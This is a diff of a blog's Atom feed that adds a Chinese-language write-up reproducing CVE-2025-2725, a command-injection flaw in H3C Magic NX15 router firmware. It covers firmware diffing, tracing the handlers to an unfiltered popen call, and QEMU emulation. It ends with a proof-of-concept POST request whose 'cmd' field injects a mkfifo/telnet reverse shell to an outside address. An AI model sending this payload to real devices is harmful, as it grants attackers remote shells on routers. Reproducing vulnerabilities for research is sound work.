@@ -3,39 +3,39 @@
     <id>https://yhuanhuan01.github.io</id>
     <title> • Posts by &#34;iot&#34; tag</title>
     <link href="https://yhuanhuan01.github.io" />
-    <updated>2025-03-21T11:01:36.000Z</updated>
+    <updated>2025-04-19T11:39:23.000Z</updated>
     <category term="Game" />
+    <category term="wp" />
     <category term="栈" />
     <category term="shellcode" />
     <category term="rw" />
-    <category term="wp" />
     <category term="CVE-复现系列" />
+    <category term="技巧" />
     <category term="堆拓展攻击" />
     <category term="orw" />
     <category term="堆栈结合" />
-    <category term="技巧" />
-    <category term="IO_FILE" />
     <category term="IOT" />
+    <category term="IO_FILE" />
     <category term="canary" />
-    <category term="堆" />
     <category term="靶机渗透" />
     <category term="vulnHUB" />
     <category term="csu" />
     <category term="rop" />
     <category term="gdb" />
+    <category term="堆" />
     <category term="pie" />
     <category term="格式化字符串漏洞" />
     <category term="house系列" />
     <category term="house-of-apple" />
-    <category term="house-of-einherjar" />
     <category term="house-of-force" />
     <category term="house-of-orange" />
+    <category term="house-of-einherjar" />
     <category term="house-of-rabbit" />
     <category term="house-of-spirit" />
-    <category term="格式化字符串" />
-    <category term="got表" />
     <category term="栈劫持" />
     <category term="protocol" />
+    <category term="格式化字符串" />
+    <category term="got表" />
     <category term="srop" />
     <category term="house-of-lore" />
     <category term="tcache-stashing-unlink-attack" />
@@ -45,6 +45,96 @@
     <category term="随机数检查" />
     <category term="堆——格式化字符串" />
     <category term="栈迁移" />
+    <entry>
+        <id>https://yhuanhuan01.github.io/2025/04/19/H3C-Magic-NX15%E2%80%94%E2%80%94cve-2025-2725%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
+        <title>H3C-Magic-NX15——cve-2025-2725复现分析</title>
+        <link rel="alternate" href="https://yhuanhuan01.github.io/2025/04/19/H3C-Magic-NX15%E2%80%94%E2%80%94cve-2025-2725%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
+        <content type="html">&lt;h1 id=&#34;h3c-magic-nx15-cve-2025-2725复现分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#h3c-magic-nx15-cve-2025-2725复现分析&#34;&gt;#&lt;/a&gt; H3C-Magic-NX15 cve-2025-2725 复现分析&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;固件下载地址：👉https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/Catalog/H3C_N/NX15/?CHID=746147&amp;amp;v=612&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxkYi5jb20vP2lkLjMwMDc0NQ==&#34;&gt;由 vulndb 概括：&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;H3C Magic NX15、Magic NX30 Pro、Magic NX400、Magic R3010 和 Magic BE18000（V100R014 及更高版本）中发现一个被列为&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxkYi5jb20vP2tiLnJpc2s=&#34;&gt;严重（Critical）的漏洞。该漏洞影响了&lt;/span&gt; HTTP POST 请求处理程序组件中文件 &lt;code&gt;/api/login/auth&lt;/code&gt;  的一些未知功能。操作会导致命令注入。该漏洞编号为&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxkYi5jb20vP3NvdXJjZV9jdmUuMzAwNzQ1&#34;&gt; CVE-2025-2725&lt;/span&gt;。此攻击需要访问本地网络。此外，还存在一个可用的漏洞利用程序。建议升级受影响的组件。&lt;/p&gt;
+&lt;h4 id=&#34;复现流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现流程&#34;&gt;#&lt;/a&gt; 复现流程&lt;/h4&gt;
+&lt;p&gt;从厂家下载固件，并进行 binwalk 解包。由厂家已经更了一个新固件，同时进行解包，看一下里面哪里发生了改变。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419140741592.png&#34; alt=&#34;image-20250419140741592&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419191124201.png&#34; alt=&#34;image-20250419191124201&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这些函数都有修改过&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;int __fastcall FCGI_WizardProtoProcess(const char *a1, int a2, int a3)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;看一下这个函数，被传入三个参数，大概率是同样调用的函数。我们需要交叉引用定位到上游函数。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143053433.png&#34; alt=&#34;image-20250419143053433&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;int __fastcall FCGI_WizardProcess(const char *a1)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;再次定位，可以定位到主函数。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;int __fastcall ftext(int argc, const char **argv, const char **envp)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143254921.png&#34; alt=&#34;image-20250419143254921&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现进入分支是匹配 &lt;code&gt;v11 == /wizard&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;v10 = getenv(“PATH_INFO”);&lt;/p&gt;
+&lt;p&gt;…&lt;/p&gt;
+&lt;p&gt;v11 = (const char *)v10;&lt;/p&gt;
+&lt;p&gt;…&lt;/p&gt;
+&lt;p&gt;else if ( !strncmp(v11, “/wizard”, 7) )&lt;br&gt;
+{&lt;br&gt;
+FCGI_WizardProcess(v11);&lt;br&gt;
+}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;v11 是请求路径 - PATH_INFO&lt;/p&gt;
+&lt;p&gt;接下来进行分析 &lt;code&gt;int __fastcall FCGI_WizardProtoProcess(const char *a1, int a2, int a3)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143643431.png&#34; alt=&#34;image-20250419143643431&#34;&gt;&lt;/p&gt;
+&lt;p&gt;路径存在则不会进入此分支。问题不大。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143750174.png&#34; alt=&#34;image-20250419143750174&#34;&gt;&lt;/p&gt;
+&lt;p&gt;要有请求体长度&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143854637.png&#34; alt=&#34;image-20250419143854637&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这些路径都是我们不能匹配到的。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419143949084.png&#34; alt=&#34;image-20250419143949084&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以进入此函数，需要匹配到上面请求路径即可，v15 则是请求路径长度。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;FCGI_WizardProtoProcess(path_info, path_lent, ct_lent);&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;至此三个参数已经明晰。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144207159.png&#34; alt=&#34;image-20250419144207159&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;FCGI_WizardProtoProcess&lt;/code&gt;  这个分支并没有发现命令注入的点，所以不能进入此分支。&lt;/p&gt;
+&lt;p&gt;所以，我们不如先去定位到执行系统命令函数。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144406934.png&#34; alt=&#34;image-20250419144406934&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以在此函数找到内找到 popen 函数，大概率猜测是 FCGI 库内的执行系统命令的函数，找找这个就行，分析函数内部逻辑即可&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;huan@huan-IOT-Virtual-Platform&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; - &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;~/桌面/IOT分析/H3C_Magic_NX15&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; - &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;六 &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;月 &lt;span class=&#34;token number&#34;&gt;19&lt;/span&gt;, 01:41&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;$&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; FCGI_popen               &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: extractions/NX15V100R014.bin.extracted/1F0000/squashfs-root/usr/lib/libfcgi.so.0.0.0: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419144750151.png&#34; alt=&#34;image-20250419144750151&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现调用了 popen，所以这就是可以执行命令的函数。&lt;/p&gt;
+&lt;p&gt;从下向上分析。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419191640633.png&#34; alt=&#34;image-20250419191640633&#34;&gt;&lt;/p&gt;
+&lt;p&gt;并没有任何过滤，所以可以进行命令注入。&lt;/p&gt;
+&lt;p&gt;分析的差不多，接下来就使用 qemu 搭建虚拟环境。&lt;/p&gt;
+&lt;h4 id=&#34;搭建虚拟环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搭建虚拟环境&#34;&gt;#&lt;/a&gt; 搭建虚拟环境&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419145644271.png&#34; alt=&#34;image-20250419145644271&#34;&gt;&lt;/p&gt;
+&lt;p&gt;主机内&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; qemu-system-mipsel &lt;span class=&#34;token parameter variable&#34;&gt;-nographic&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-M&lt;/span&gt; malta &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-kernel&lt;/span&gt; vmlinux-2.6.32-5-4kc-malta &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-hda&lt;/span&gt; debian_squeeze_mipsel_standard.qcow2 &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-net&lt;/span&gt; nic,macaddr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;52&lt;/span&gt;:54:00:12:34:56 &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-net&lt;/span&gt; tap &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-append&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;root=/dev/sda1 console=ttyS0&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;虚拟机内&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419150709792.png&#34; alt=&#34;image-20250419150709792&#34;&gt;&lt;/p&gt;
+&lt;p&gt;传输文件&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 主机内&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;tar&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-cvf&lt;/span&gt; squashfs-root.tar squashfs-root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;scp&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;HostKeyAlgorithms&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;+ssh-rsa,ssh-dss &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-O&lt;/span&gt; squashfs-root.tar root@192.168.0.1:~/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#虚拟机内&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;tar&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-xvf&lt;/span&gt; squashfs-root.tar&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;chroot 设置根目录&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root@debian-mipsel:~/squashfs-root&lt;span class=&#34;token comment&#34;&gt;# mount -t proc /proc ./proc/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root@debian-mipsel:~/squashfs-root&lt;span class=&#34;token comment&#34;&gt;# mount -o bind /dev ./dev/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root@debian-mipsel:~/squashfs-root&lt;span class=&#34;token comment&#34;&gt;# chroot ../squashfs-root/ sh&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;启动 web 服务&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt; /var/run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt; /var/log/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt; /var/log/lighttpd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./sbin/procd &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./sbin/ubusd &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./usr/sbin/lighttpd &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; ./etc/lighttpd/lighttpd.conf &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419192600159.png&#34; alt=&#34;image-20250419192600159&#34;&gt;&lt;/p&gt;
+&lt;p&gt;等待时间一会&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419180101476.png&#34; alt=&#34;image-20250419180101476&#34;&gt;&lt;/p&gt;
+&lt;p&gt;虽然在加载，我们去查看接口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419180206626.png&#34; alt=&#34;image-20250419180206626&#34;&gt;&lt;/p&gt;
+&lt;p&gt;显示 200 估计没多大问题。&lt;/p&gt;
+&lt;h4 id=&#34;构造poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#构造poc&#34;&gt;#&lt;/a&gt; 构造 POC&lt;/h4&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/api/wizard/getsyncpppoecfg&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;192.168.0.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/json;charset=utf-8&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Origin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://192.168.0.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/json, text/plain, */*&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://192.168.0.1/login&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;108&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;#123;&#34;cmd&#34;:&#34;&#39;; mkfifo /tmp/f; /usr/bin/telnet 192.168.0.254 10001 &amp;lt; /tmp/f | /bin/sh &gt; /tmp/f; rm /tmp/f; &#39;&#34;&amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;cmd 是传进的 post 参数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/H3C-Magic-NX15_CVE-2025-2725/image-20250419193338001.png&#34; alt=&#34;image-20250419193338001&#34;&gt;&lt;/p&gt;
+&lt;p&gt;至此攻击流程完毕，还有几个 CVE 流程跟这个一样。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CVE-2025-2725&lt;/p&gt;
+&lt;p&gt;CVE-2025-2726&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="IOT" />
+        <updated>2025-04-19T11:39:23.000Z</updated>
+    </entry>
     <entry>
         <id>https://yhuanhuan01.github.io/2025/03/21/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/</id>
         <title>GL-iNet-路由器-CVE-2024-39226</title>
